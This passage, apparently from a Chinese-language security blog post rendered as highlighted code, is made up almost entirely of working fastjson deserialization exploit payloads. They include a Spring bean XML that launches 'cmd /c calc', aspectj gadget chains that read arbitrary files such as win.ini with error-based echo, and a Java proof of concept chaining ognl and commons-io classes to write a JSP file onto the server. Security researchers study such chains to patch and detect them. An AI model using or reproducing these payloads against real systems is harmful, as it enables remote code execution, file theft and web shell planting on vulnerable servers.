+</span></span><span style=display:flex><span>       <span style=color:#f92672>&lt;value&gt;</span>cmd<span style=color:#f92672>&lt;/value&gt;</span>
+</span></span><span style=display:flex><span>       <span style=color:#f92672>&lt;value&gt;</span>/c<span style=color:#f92672>&lt;/value&gt;</span>
+</span></span><span style=display:flex><span>       <span style=color:#f92672>&lt;value&gt;</span>calc<span style=color:#f92672>&lt;/value&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/list&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/constructor-arg&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;property</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;whatever&#34;</span> <span style=color:#a6e22e>value=</span><span style=color:#e6db74>&#34;#{pb.start()}&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/bean&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/beans&gt;</span>
+</span></span></code></pre></div><p><code>aspectj</code>任意文件读取：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#75715e>//第一次
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>{
+</span></span><span style=display:flex><span>   <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Exception&#34;</span>,
+</span></span><span style=display:flex><span>   <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>//第二次
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   {
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Class&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;val&#34;</span>:{
+</span></span><span style=display:flex><span>         <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.String&#34;</span>{
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.util.Locale&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;val&#34;</span>:{
+</span></span><span style=display:flex><span>         <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;com.alibaba.fastjson.JSONObject&#34;</span>,<span style=color:#960050;background-color:#1e0010>{</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.String&#34;</span>
+</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;newAnnotationProcessorUnits&#34;</span>:[{}]
+</span></span><span style=display:flex><span>   }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>//第三次，针对Windows系统
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>   {
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;x&#34;</span>:{
+</span></span><span style=display:flex><span>         <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&#34;</span>,
+</span></span><span style=display:flex><span>         <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&#34;</span>,
+</span></span><span style=display:flex><span>         <span style=color:#f92672>&#34;fileName&#34;</span>:<span style=color:#e6db74>&#34;c:\\windows\win.ini&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>   }
+</span></span><span style=display:flex><span><span style=color:#75715e>//另一种姿势，报错回显
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;java.lang.Character&#34;</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;c&#34;</span>:{
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;@type&#34;</span>:<span style=color:#e6db74>&#34;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;fileName&#34;</span>:<span style=color:#e6db74>&#34;c:/windows/win.ini&#34;</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>//第三次2 报错回显
+</span></span></span></code></pre></div><p><code>commons-io</code>写入文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.JSON;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.parser.ParserConfig;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> jdk.nashorn.internal.parser.JSONParser;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>demo</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
+</span></span><span style=display:flex><span>        String code <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test&#34;</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> 8200; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>            code <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;a&#34;</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        String poc2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;    \r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;  \&#34;su14\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;@type\&#34;: \&#34;java.lang.Exception\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;@type\&#34;: \&#34;ognl.OgnlException\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;  },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;  \&#34;su15\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;@type\&#34;: \&#34;java.lang.Class\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;val\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;: \&#34;com.alibaba.fastjson.JSONObject\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;: \&#34;java.lang.String\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;: \&#34;ognl.OgnlException\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;_evaluation\&#34;: \&#34;\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;su16\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;: \&#34;ognl.Evaluation\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;node\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;: \&#34;ognl.ASTMethod\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;p\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;@type\&#34;: \&#34;ognl.OgnlParser\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;stream\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.BOMInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;delegate\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.ReaderInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;reader\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.XmlStreamReader\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;is\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.TeeInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;input\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.ReaderInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;reader\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.CharSequenceReader\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;charSequence\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.String\&#34;\&#34;&#34;</span><span style=color:#f92672>+</span>code<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;charsetName\&#34;:\&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;bufferSize\&#34;:1024\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;branch\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;:\&#34;org.apache.commons.io.output.WriterOutputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;writer\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;:\&#34;org.apache.commons.io.output.FileWriterWithEncoding\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;file\&#34;:\&#34;1.jsp\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;encoding\&#34;:\&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;append\&#34;: false\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;charsetName\&#34;:\&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;bufferSize\&#34;: 1024,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;writeImmediately\&#34;: true\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;closeBranch\&#34;: true\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;httpContentType\&#34;:\&#34;text/xml\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;lenient\&#34;:false,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;defaultEncoding\&#34;:\&#34;UTF-8\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bufferSize\&#34;: 1024\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;boms\&#34;: [{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.ByteOrderMark\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bytes\&#34;: [\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;                36,82\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              ]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            }]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;su17\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;: \&#34;ognl.Evaluation\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;node\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;: \&#34;ognl.ASTMethod\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;p\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;@type\&#34;: \&#34;ognl.OgnlParser\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;stream\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.BOMInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;delegate\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.ReaderInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;reader\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.XmlStreamReader\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;is\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.TeeInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;input\&#34;:{\&#34;$ref\&#34;: \&#34;$.su16.node.p.stream.delegate.reader.is.input\&#34;},\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;branch\&#34;:{\&#34;$ref\&#34;: \&#34;$.su16.node.p.stream.delegate.reader.is.branch\&#34;},\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;closeBranch\&#34;: true\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;httpContentType\&#34;:\&#34;text/xml\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;lenient\&#34;:false,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;defaultEncoding\&#34;:\&#34;UTF-8\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bufferSize\&#34;: 1024\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;boms\&#34;: [{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.ByteOrderMark\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bytes\&#34;: [\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;                36,82\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              ]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            }]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;su18\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;: \&#34;ognl.Evaluation\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;node\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;: \&#34;ognl.ASTMethod\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;p\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;@type\&#34;: \&#34;ognl.OgnlParser\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;stream\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.BOMInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;delegate\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.ReaderInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;reader\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.XmlStreamReader\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;is\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.TeeInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;input\&#34;:{\&#34;$ref\&#34;: \&#34;$.su16.node.p.stream.delegate.reader.is.input\&#34;},\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;branch\&#34;:{\&#34;$ref\&#34;: \&#34;$.su16.node.p.stream.delegate.reader.is.branch\&#34;},\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;closeBranch\&#34;: true\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;httpContentType\&#34;:\&#34;text/xml\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;lenient\&#34;:false,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;defaultEncoding\&#34;:\&#34;UTF-8\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bufferSize\&#34;: 1024\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;boms\&#34;: [{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.ByteOrderMark\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bytes\&#34;: [\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;                36,82\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              ]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            }]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        }\r\n&#34;</span>
